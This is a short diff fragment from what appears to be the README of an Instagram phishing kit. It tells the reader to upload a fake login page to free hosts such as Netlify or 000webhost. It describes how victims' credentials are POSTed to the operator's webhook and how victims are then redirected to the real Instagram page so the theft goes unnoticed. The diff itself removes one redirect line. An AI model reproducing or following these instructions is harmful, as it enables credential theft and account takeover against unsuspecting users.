@@ -6,7 +6,7 @@ request.open("POST", "Webhook");
 
 Next, you upload it to your website (like Netlify or 000webhost, they are free)
 When someone will login you will receive his credentials and he will be redirected to the official Insta login page. (the one in the link, you can change it by editing the link and the js part in HTML on line 108).
-window.location.replace("https://instagram.com/p/CR8V_TNF4gW/");
+
 
 
 
